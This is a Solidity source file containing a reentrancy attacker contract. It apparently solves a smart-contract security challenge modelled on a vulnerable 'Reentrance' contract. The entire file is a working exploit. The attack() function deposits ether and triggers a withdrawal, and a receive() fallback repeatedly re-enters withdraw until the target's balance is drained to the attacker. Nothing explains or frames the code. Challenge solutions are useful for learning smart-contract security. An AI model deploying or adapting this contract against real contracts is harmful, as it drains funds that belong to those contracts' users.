// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
    function donate(address) external payable;

    function withdraw(uint256) external;

    function balanceOf(address) external view returns (uint256);
}

contract ReentranceAttacker {
    address private target;

    constructor(address _target) {
        target = _target;
    }

    function attack() external payable {
        IReentrance(target).donate{value: address(this).balance}(address(this));
        IReentrance(target).withdraw(
            IReentrance(target).balanceOf(address(this))
        );
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {
        uint256 etherToGet = IReentrance(target).balanceOf(address(this));
        if (target.balance < etherToGet) {
            etherToGet = target.balance;
        }
        IReentrance(target).withdraw(etherToGet);
    }
}
